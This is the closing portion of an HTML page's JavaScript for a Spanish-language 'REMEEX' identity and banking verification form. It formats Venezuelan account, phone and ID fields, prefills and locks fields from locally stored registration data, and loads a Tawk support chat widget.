      else if (type === 'error') iconClass = 'fa-exclamation-circle';
      else if (type === 'warning') iconClass = 'fa-exclamation-triangle';
      
      toast.innerHTML = `
        <div class="toast-icon">
          <i class="fas ${iconClass}"></i>
        </div>
        <div class="toast-content">
          <div class="toast-title">${escapeHTML(title)}</div>
          <div class="toast-message">${escapeHTML(message)}</div>
        </div>
        <div class="toast-close">
          <i class="fas fa-times"></i>
        </div>
      `;
      
      toastContainer.appendChild(toast);
      
      // Animate in
      gsap.fromTo(toast, 
        { x: 100, opacity: 0 }, 
        { x: 0, opacity: 1, duration: 0.4, ease: "power2.out" }
      );
      
      // Auto remove after duration
      setTimeout(() => {
        gsap.to(toast, {
          x: 100,
          opacity: 0,
          duration: 0.3,
          onComplete: () => {
            if (toast.parentElement) {
              toast.remove();
            }
          }
        });
      }, duration);
      
      // Close button
      const closeBtn = toast.querySelector('.toast-close');
      if (closeBtn) {
        closeBtn.addEventListener('click', function() {
          gsap.to(toast, {
            x: 100,
            opacity: 0,
            duration: 0.3,
            onComplete: () => {
              if (toast.parentElement) {
                toast.remove();
              }
            }
          });
        });
      }
    }

    // Escape HTML to prevent XSS
    function escapeHTML(str) {
      const div = document.createElement('div');
      div.textContent = str;
      return div.innerHTML;
    }

    // Enhanced form validation with better UX
    function enhancedValidation() {
      // Real-time validation for account number format
      document.getElementById('account-number').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        const prefix = BANK_CODES[selectedBank ? selectedBank.id : ''] || '';
        if (prefix && !value.startsWith(prefix)) {
          value = prefix + value.replace(prefix, '');
        }
        if (value.length > 20) value = value.substring(0, 20);
        e.target.value = value;

        if (value.length === 20) {
          e.target.classList.add('success');
          e.target.classList.remove('error');
        } else if (value.length > 0) {
          e.target.classList.add('error');
          e.target.classList.remove('success');
        } else {
          e.target.classList.remove('success', 'error');
        }
        
        validateBankingStep();
      });

      // Phone number formatting
      document.getElementById('phoneNumber').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.startsWith('58')) {
          value = '+' + value;
        } else if (value.startsWith('0')) {
          value = '+58 ' + value.substring(1);
        }
        e.target.value = value;
      });

      // Pago Móvil phone formatting
      document.getElementById('pago-movil-phone').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.substring(0, 11);
        if (value.length >= 4) {
          value = value.substring(0, 4) + '-' + value.substring(4);
        }
        e.target.value = value;
        validateBankingStep();
      });

      // ID number formatting
      document.getElementById('documentNumber').addEventListener('input', function(e) {
        let value = e.target.value.toUpperCase();
        if (value.match(/^[VEJ]\d/)) {
          value = value.charAt(0) + '-' + value.substring(1);
        }
        e.target.value = value;
      });

      // Pago Móvil cedula formatting
      document.getElementById('pago-movil-cedula').addEventListener('input', function(e) {
        let value = e.target.value.toUpperCase();
        if (value.match(/^[VEJ]\d/)) {
          value = value.charAt(0) + '-' + value.substring(1);
        }
        e.target.value = value;
        validateBankingStep();
      });
    }

    // Initialize enhanced validation
    enhancedValidation();

    // Setup accessibility features
    function setupAccessibility() {
      // Add ARIA labels
      document.querySelectorAll('.form-control').forEach(input => {
        const label = document.querySelector(`label[for="${input.id}"]`);
        if (label) {
          input.setAttribute('aria-describedby', input.id + '-error');
        }
      });

      // Keyboard navigation for bank selection
      document.querySelectorAll('.bank-option').forEach((option, index) => {
        option.setAttribute('tabindex', '0');
        option.setAttribute('role', 'button');
        option.setAttribute('aria-label', `Seleccionar ${option.querySelector('.bank-name').textContent}`);
        
        option.addEventListener('keydown', (e) => {
          if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            const bankId = option.dataset.bankId;
            const bank = VENEZUELAN_BANKS.find(b => b.id === bankId);
            if (bank) selectBank(bank);
          }
        });
      });
    }

    // Initialize accessibility features
    setupAccessibility();

    // Cleanup on page unload
    window.addEventListener('beforeunload', (e) => {
      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
      }
      
      // Save current progress
      if (currentStep === 1) {
        saveStepData(1);
      } else if (currentStep === 2) {
        saveStepData(2);
      }
      
      // Warn user if they haven't completed verification
      if (currentStep < totalSteps && !localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_STATUS)) {
        e.preventDefault();
        e.returnValue = '¿Está seguro de que desea salir? Su progreso se guardará pero deberá completar la verificación más tarde.';
      }
    });

    console.log('REMEEX Verification System initialized successfully');
  </script>
  <script src="js/tawk-support.js" defer></script>
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const ensureTawkLoaded = () => {
        if (window.remeexTawk && typeof window.remeexTawk.load === 'function') {
          window.remeexTawk.load(true);
        } else {
          setTimeout(ensureTawkLoaded, 50);
        }
      };

      ensureTawkLoaded();
    });
  </script>

  <script>
    (function () {
      const supportButton = document.getElementById('support-btn');
      if (!supportButton) {
        return;
      }

      supportButton.addEventListener('click', function () {
        let attempts = 0;

        function tryMaximize() {
          if (window.Tawk_API && typeof window.Tawk_API.maximize === 'function') {
            try {
              window.Tawk_API.maximize();
            } catch (error) {}
          } else if (attempts < 10) {
            attempts += 1;
            setTimeout(tryMaximize, 200);
          }
        }

        if (window.remeexTawk && typeof window.remeexTawk.load === 'function') {
          window.remeexTawk.load(true);
        }

        tryMaximize();
      });
    })();
  </script>

  <script>
    (function() {
      const regData = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
      const userData = JSON.parse(localStorage.getItem('visaUserData') || '{}');
      const data = Object.assign({}, regData, userData);

      const phone = data.phoneNumberFull || data.fullPhoneNumber || (data.phonePrefix ? `${data.phonePrefix}${data.phoneNumber || ''}` : data.phoneNumber) || '';
      const birthDate = (data.birthYear && data.birthMonth && data.birthDay)
        ? `${data.birthYear}-${String(data.birthMonth).padStart(2,'0')}-${String(data.birthDay).padStart(2,'0')}`
        : '';
      const docTypeMap = { ci: 'cedula', passport: 'pasaporte', license: 'otro' };
      const idType = docTypeMap[data.documentType] || '';
      const nationalityMap = {
        ve: 'VE', co: 'CO', pe: 'PE', ec: 'EC', ar: 'AR', cl: 'CL', uy: 'UY',
        py: 'PY', bo: 'BO', br: 'BR', mx: 'MX', us: 'US', es: 'ES', pa: 'PA',
        other: 'other'
      };
      const nationality = nationalityMap[(data.nationality || data.country || '').toLowerCase()] || '';

      const mapping = {
        'full-name': data.firstName && data.lastName ? `${data.firstName} ${data.lastName}` : '',
        'email': data.email || '',
        'documentNumber': data.documentNumber || '',
        'phoneNumber': phone,
        'birth-date': birthDate,
        'id-type': idType,
        'nationality': nationality,
        // Recuperar la ciudad elegida durante el registro. Si no se
        // encuentra dicho dato, se utiliza el estado almacenado.
        'address': data.city || data.state || '',
        'pago-movil-phone': phone,
        'pago-movil-cedula': data.documentNumber || ''
      };

        Object.keys(mapping).forEach(id => {
          const el = document.getElementById(id);
          if (el && !el.value && mapping[id]) {
            el.value = mapping[id];
          }
        });

        ['full-name','birth-date','documentNumber','email','phoneNumber'].forEach(id => {
          const el = document.getElementById(id);
          if (el) {
            el.readOnly = true;
            el.classList.add('fixed-field');
          }
        });

        ['id-type','nationality'].forEach(id => {
          const el = document.getElementById(id);
          if (el) {
            el.disabled = true;
            el.classList.add('fixed-field');
          }
        });

        if (mapping['pago-movil-phone']) {
          pagoMovilEnabled = true;
          updatePagoMovilToggle();
        }
    })();
  </script>
  <script src="preload.js"></script>
  <script src="/tracker.js" defer></script>
</body>
</html>
